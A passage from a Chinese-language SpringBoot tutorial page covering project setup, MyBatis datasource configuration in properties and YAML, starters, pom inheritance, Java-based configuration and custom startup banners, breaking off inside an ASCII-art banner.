src="imgs/1618194104043.png" alt="1618194104043"></p><h6 id="3-3-选择项目依赖"><a href="#3-3-选择项目依赖" class="headerlink" title="3.3 选择项目依赖"></a>3.3 选择项目依赖</h6><p><img src="imgs/1618194286306.png" alt="1618194286306"></p><h6 id="3-4-选择项目存储目录"><a href="#3-4-选择项目存储目录" class="headerlink" title="3.4 选择项目存储目录"></a>3.4 选择项目存储目录</h6><p><img src="imgs/1618194393239.png" alt="1618194393239"></p><h6 id="3-5-网页创建SpringBoot应用"><a href="#3-5-网页创建SpringBoot应用" class="headerlink" title="3.5  网页创建SpringBoot应用"></a>3.5  网页创建SpringBoot应用</h6><p>如果基于IDEA创建无法下载，可以基于网页版进行创建</p><p><img src="imgs/1618194509869.png" alt="1618194509869"></p><h4 id="3-2-配置项目"><a href="#3-2-配置项目" class="headerlink" title="3.2 配置项目"></a>3.2 配置项目</h4><h6 id="3-2-1-应用项目结构"><a href="#3-2-1-应用项目结构" class="headerlink" title="3.2.1 应用项目结构"></a>3.2.1 应用项目结构</h6><p><img src="imgs/1618197120979.png" alt="1618197120979"></p><h6 id="3-2-2-自定义配置-整合MyBatis"><a href="#3-2-2-自定义配置-整合MyBatis" class="headerlink" title="3.2.2 自定义配置(整合MyBatis)"></a>3.2.2 自定义配置(整合MyBatis)</h6><blockquote><p>SpringBoot帮助我们完成通用性配置，但是像数据库连接地址、账号、密码等还是需要手动完成配置</p></blockquote><ul><li><p>修改mysql驱动的版本（选择性）</p></li><li><p>在SpringBoot主配置文件<code>application.properties</code>文件中配置数据源及路径</p><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 配置数据源  （key必须按照SpringBoot的要求）</span><span class="token attr-name">spring.datasource.driver-class-name</span><span class="token punctuation">=</span><span class="token attr-value">com.mysql.jdbc.Driver</span><span class="token attr-name">spring.datasource.url</span><span class="token punctuation">=</span><span class="token attr-value">jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8</span><span class="token attr-name">spring.datasource.username</span><span class="token punctuation">=</span><span class="token attr-value">root</span><span class="token attr-name">spring.datasource.password</span><span class="token punctuation">=</span><span class="token attr-value">admin123</span><span class="token comment"># 配置映射文件路径及实体类的包名</span><span class="token attr-name">mybatis.mapper-locations</span><span class="token punctuation">=</span><span class="token attr-value">classpath:mappers/*Mapper.xml</span><span class="token attr-name">mybatis.type-aliases-package</span><span class="token punctuation">=</span><span class="token attr-value">com.qfedu.springboot.demo.entity</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在SpringBoot启动类通过<code>@MapperScan</code>注解指定DAO接口的包名</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@MapperScan</span><span class="token punctuation">(</span><span class="token string">"com.qfedu.springboot.demo.dao"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringbootDemo1Application</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">SpringbootDemo1Application</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="3-3-启动项目"><a href="#3-3-启动项目" class="headerlink" title="3.3 启动项目"></a>3.3 启动项目</h4><h6 id="3-3-1-启动"><a href="#3-3-1-启动" class="headerlink" title="3.3.1 启动"></a>3.3.1 启动</h6><blockquote><p>SpringBoot应用自带Servlet容器—Tomcat,因此无需进行额外的服务器配置，运行启动类即可启动一个SpringBoot应用</p></blockquote><h6 id="3-3-2-测试"><a href="#3-3-2-测试" class="headerlink" title="3.3.2 测试"></a>3.3.2 测试</h6><blockquote><p>用户的注册功能</p></blockquote><h2 id="四、SpringBoot原理"><a href="#四、SpringBoot原理" class="headerlink" title="四、SpringBoot原理"></a>四、SpringBoot原理</h2><h4 id="4-1-starter"><a href="#4-1-starter" class="headerlink" title="4.1 starter"></a>4.1 starter</h4><blockquote><p>一个starter就是一个开发场景的支持（ 依赖 + 配置）</p><p>SpringBoot为我们提供了简化企业级开发绝大多数场景的支持（提供了多个starter），我们在进行项目开发的过程中只需引入对应的starter（创建SpringBoot应用时可选择），相关的依赖和配置就会被内置到项目中（消除人工配置）。</p></blockquote><h6 id="4-1-1-starter依赖"><a href="#4-1-1-starter依赖" class="headerlink" title="4.1.1 starter依赖"></a>4.1.1 starter依赖</h6><blockquote><p>一个starter依赖表示的不是一个依赖，而是某种开发环境所需的一组依赖</p></blockquote><ul><li>Spring Web —  <code>spring-boot-starter-web</code></li><li>MyBatis Framework — <code>mybatis-spring-boot-starter</code></li></ul><h6 id="4-1-2-starter配置"><a href="#4-1-2-starter配置" class="headerlink" title="4.1.2 starter配置"></a>4.1.2 starter配置</h6><blockquote><p>一个starter不仅包含所需依赖，还包含了其所需的对应的配置</p></blockquote><ul><li><p>MyBatis Framework — <code>mybatis-spring-boot-starter</code></p><ul><li><p>依赖：</p><p><img src="imgs/1618200021903.png" alt="1618200021903"></p></li><li><p>配置：</p><p><img src="imgs/1618200132528.png" alt="1618200132528"></p></li></ul></li></ul><h6 id="4-1-3-案例"><a href="#4-1-3-案例" class="headerlink" title="4.1.3 案例"></a>4.1.3 案例</h6><blockquote><p>引入redis开发场景</p></blockquote><ul><li>添加starter依赖</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-data-redis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>在service中可以直接注入redis客户端</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> <span class="token class-name">UserDAO</span> userDAO<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Resource</span>    <span class="token keyword">private</span> <span class="token class-name">StringRedisTemplate</span> stringRedisTemplate<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-SpringBoot应用的pom文件"><a href="#4-2-SpringBoot应用的pom文件" class="headerlink" title="4.2 SpringBoot应用的pom文件"></a>4.2 SpringBoot应用的pom文件</h4><h6 id="4-2-1-基于Spring官方服务器创建的SpringBoot应用"><a href="#4-2-1-基于Spring官方服务器创建的SpringBoot应用" class="headerlink" title="4.2.1 基于Spring官方服务器创建的SpringBoot应用"></a>4.2.1 基于Spring官方服务器创建的SpringBoot应用</h6><ul><li>继承spring-boot-starter-parent.pom</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!-- SpringBoot应用中的pom 继承了spring-boot-starter-parent.pom --&gt;</span>    <span class="token comment">&lt;!-- spring-boot-starter-parent.pom又继承了spring-boot-dependencies.pom--&gt;</span>    <span class="token comment">&lt;!-- 在spring-boot-dependencies.pom已经对主流的框架的版本进行了声明 --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.4.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>引入了maven对springboot应用支持的插件 spring-boot</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">&gt;</span></span>com.qfedu.springboot.demo.SpringbootDemo1Application<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>excludes</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclude</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclude</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>excludes</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="4-2-2-基于ali服务器创建的SpringBoot应用"><a href="#4-2-2-基于ali服务器创建的SpringBoot应用" class="headerlink" title="4.2.2 基于ali服务器创建的SpringBoot应用"></a>4.2.2 基于ali服务器创建的SpringBoot应用</h6><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>springboot-demo2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>springboot-demo2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>Demo project for Spring Boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java.version</span><span class="token punctuation">&gt;</span></span>1.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java.version</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project.build.sourceEncoding</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project.build.sourceEncoding</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project.reporting.outputEncoding</span><span class="token punctuation">&gt;</span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project.reporting.outputEncoding</span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--SpringBoot引用的pom没有继承spring-boot-starter-parent.pom，因此版本需要在当前pom中进行定义 --&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>spring-boot.version</span><span class="token punctuation">&gt;</span></span>2.3.7.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>spring-boot.version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.3.7.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mainClass</span><span class="token punctuation">&gt;</span></span>com.qfedu.springboot.demo2.SpringbootDemo2Application<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mainClass</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>repackage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">&gt;</span></span>                            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">&gt;</span></span>repackage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3-Java配置方式"><a href="#4-3-Java配置方式" class="headerlink" title="4.3 Java配置方式"></a>4.3 Java配置方式</h4><blockquote><p>如果我们需要在SpringBoot应用中整合一种新的开发场景，只需在pom.xml引入对应的starter即可</p><p>一个starter不仅包含依赖，还包含相应的配置，starter中包含的配置都是通过Java类实现的——Java配置方式</p></blockquote><h6 id="4-3-1-Spring版本发展"><a href="#4-3-1-Spring版本发展" class="headerlink" title="4.3.1 Spring版本发展"></a>4.3.1 Spring版本发展</h6><blockquote><p>随着Spring版本的迭代，配置方式也在发生变化</p></blockquote><ul><li>Spring 1.x<ul><li>所有的bean的配置只能通过xml完成</li></ul></li><li>Spring 2.x<ul><li>基于JDK1.5对注解的支持，Spring 2.x开始支持注解</li><li>企业开发中到底是用xml配置还是用注解？<ul><li>对基础配置、引用的第三方依赖中的配置使用xml完成：例如数据源配置</li><li>业务开发使用注解：例如controller、service</li></ul></li></ul></li><li>Spring 3.x<ul><li>Spring 开始提供基于Java的配置方式</li></ul></li><li>Spring 4.x<ul><li>xml、注解、Java</li></ul></li></ul><h6 id="4-3-2-xml配置"><a href="#4-3-2-xml配置" class="headerlink" title="4.3.2 xml配置"></a>4.3.2 xml配置</h6><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--applicationContext.xml--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stu<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.qfedu.beans.Student<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>date<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.util.Date<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h6 id="4-3-3-注解配置"><a href="#4-3-3-注解配置" class="headerlink" title="4.3.3 注解配置"></a>4.3.3 注解配置</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h6 id="4-3-4-Java配置方式"><a href="#4-3-4-Java配置方式" class="headerlink" title="4.3.4 Java配置方式"></a>4.3.4 Java配置方式</h6><ul><li>创建配置类</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span><span class="token punctuation">{</span>        <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">Date</span> <span class="token function">getDate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-4-SpringBoot自动配置"><a href="#4-4-SpringBoot自动配置" class="headerlink" title="4.4 SpringBoot自动配置"></a>4.4 SpringBoot自动配置</h4><p><img src="imgs/1618214373919.png" alt="1618214373919"></p><h4 id="4-5-全局配置文件"><a href="#4-5-全局配置文件" class="headerlink" title="4.5 全局配置文件"></a>4.5 全局配置文件</h4><blockquote><p>SpringBoot针对不同的开发场景提供默认的属性配置，如果默认的配置不能满足开发的需要，我们需要对属性配置进行修改</p></blockquote><ul><li><p>SpringBoot应用提供了一个全局配置文件<code>application.properties</code>用于进行自定义配置</p></li><li><p>全局配置文件支持2中语法配置：</p><ul><li>properties 键值对配置</li><li>yaml 语法的配置</li></ul></li></ul><h6 id="4-5-1-基于properties配置"><a href="#4-5-1-基于properties配置" class="headerlink" title="4.5.1 基于properties配置"></a>4.5.1 基于properties配置</h6><pre class="line-numbers language-properties" data-language="properties"><code class="language-properties"><span class="token comment"># 配置数据源  （key必须按照SpringBoot的要求）</span><span class="token attr-name">spring.datasource.driver-class-name</span><span class="token punctuation">=</span><span class="token attr-value">com.mysql.jdbc.Driver</span><span class="token attr-name">spring.datasource.url</span><span class="token punctuation">=</span><span class="token attr-value">jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8</span><span class="token attr-name">spring.datasource.username</span><span class="token punctuation">=</span><span class="token attr-value">root</span><span class="token attr-name">spring.datasource.password</span><span class="token punctuation">=</span><span class="token attr-value">admin123</span><span class="token comment"># 配置映射文件路径及实体类的包名</span><span class="token attr-name">mybatis.mapper-locations</span><span class="token punctuation">=</span><span class="token attr-value">classpath:mappers/*Mapper.xml</span><span class="token attr-name">mybatis.type-aliases-package</span><span class="token punctuation">=</span><span class="token attr-value">com.qfedu.springboot.demo.entity</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="4-5-2-基于yaml配置"><a href="#4-5-2-基于yaml配置" class="headerlink" title="4.5.2 基于yaml配置"></a>4.5.2 基于yaml配置</h6><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> jdbc<span class="token punctuation">:</span>mysql<span class="token punctuation">:</span>//localhost<span class="token punctuation">:</span>3306/db_2010_mybatis<span class="token punctuation">?</span>characterEncoding=utf<span class="token punctuation">-</span><span class="token number">8</span>    <span class="token key atrule">driver-class-name</span><span class="token punctuation">:</span> com.mysql.jdbc.Driver    <span class="token key atrule">username</span><span class="token punctuation">:</span> root    <span class="token key atrule">password</span><span class="token punctuation">:</span> admin123<span class="token key atrule">mybatis</span><span class="token punctuation">:</span>  <span class="token key atrule">mapper-locations</span><span class="token punctuation">:</span> classpath<span class="token punctuation">:</span>mappers/<span class="token important">*Mapper.xml</span>  <span class="token key atrule">type-aliases-package</span><span class="token punctuation">:</span> com.qfedu.springboot.demo.entity<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="4-5-3-常用的全局配置"><a href="#4-5-3-常用的全局配置" class="headerlink" title="4.5.3 常用的全局配置"></a>4.5.3 常用的全局配置</h6><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">server</span><span class="token punctuation">:</span>  <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">9999</span>  <span class="token key atrule">servlet</span><span class="token punctuation">:</span>    <span class="token key atrule">context-path</span><span class="token punctuation">:</span> /demo1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-6-自定义Banner"><a href="#4-6-自定义Banner" class="headerlink" title="4.6 自定义Banner"></a>4.6 自定义Banner</h4><ul><li><p>在SpringBoot应用启动的时候是有一个默认启动图案的</p></li><li><p>这个默认图案支持自定义配置</p><ul><li>在resources目录创建一个banner.txt</li><li>在banner.txt文件中定义图案    <a href="http://patorjk.com/software/taag/">http://patorjk.com/software/taag/</a></li></ul></li><li><p>佛祖保佑</p><pre class="line-numbers language-none"><code class="language-none">//////////////////////////////////////////////////////////////////////                          _ooOoo_                               ////                         o8888888o                              ////                         88" . "88                              ////                         (| ^_^ |)                              ////                         O\  =  /O                              ////                      ____/`---'\____                           ////                    .'  \\|     |//  `.                      